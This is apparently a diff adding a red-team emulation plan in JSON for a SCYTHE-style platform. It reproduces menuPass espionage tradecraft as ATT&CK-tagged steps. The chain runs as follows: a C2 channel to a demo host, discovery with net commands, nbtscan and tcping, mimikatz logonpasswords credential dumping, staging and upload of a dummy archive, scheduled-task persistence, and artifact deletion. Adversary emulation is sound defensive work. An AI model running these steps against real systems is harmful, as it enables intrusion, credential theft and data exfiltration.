@@ -1,0 +1,213 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS.",
+        "display_name": "Threat Thursday - menuPass",
+        "name": "Threat Thursday - menuPass",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "unicorn.scythedemo.com:443",
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net use",
+                "rtags": [
+                    "att&ck-technique:T1135"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net view /domain",
+                "rtags": [
+                    "att&ck-technique:T1018"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/menupass/tcping.exe\"  --dest \"%USERPROFILE%\\Downloads\\tcping.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"%USERPROFILE%\\Downloads\\tcping.exe\" 127.0.0.1 445",
+                "rtags": [
+                    "att&ck-technique:T1046"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/menupass/nbtscan-1.0.35.exe\" --dest C:\\Windows\\Temp\\nbtscan.exe",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c C:\\Windows\\Temp\\nbtscan.exe 127.0.0.1/24",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "rtags": [
+                    "att&ck-technique:T1069"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "function": "ifelse",
+                "next": 17,
+                "step": 9,
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "11": {
+                "module": "loader",
+                "module_to_load": "mimikatz",
+                "request": "--load mimikatz",
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "acc295cf-e232-4a4d-9210-1a6911beb4f8",
+                "module": "mimikatz",
+                "request": "--arglist sekurlsa::logonpasswords",
+                "rtags": [
+                    "att&ck-technique:T1003.001"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"C:\\$Recycle.Bin\\test_important.rar\" --size 1MB --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath C:\\$Recycle.Bin\\test_important.rar",
+                "rtags": [
+                    "att&ck-technique:T1041"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /CREATE /SC DAILY /TN \"MyTasks\\Example Task\" /TR \"C:\\example_service.exe\" /ST 11:00 /F",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "time": 10,
+                "type": "delay"
+            },
+            "19": {
+                "name": "Phase",
+                "type": "assign",
+                "value": "Clean Up"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /DELETE /TN \"MyTasks\\Example Task\" /F",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del /f \"C:\\$Recycle.Bin\\test_important.rar\"",
+                "rtags": [
+                    "att&ck-technique:T1551.004"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del /f \"%USERPROFILE%\\Downloads\\tcping.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1551.004"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del /f C:\\Windows\\Temp\\nbtscan.exe",
+                "rtags": [
+                    "att&ck-technique:T1551.004"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
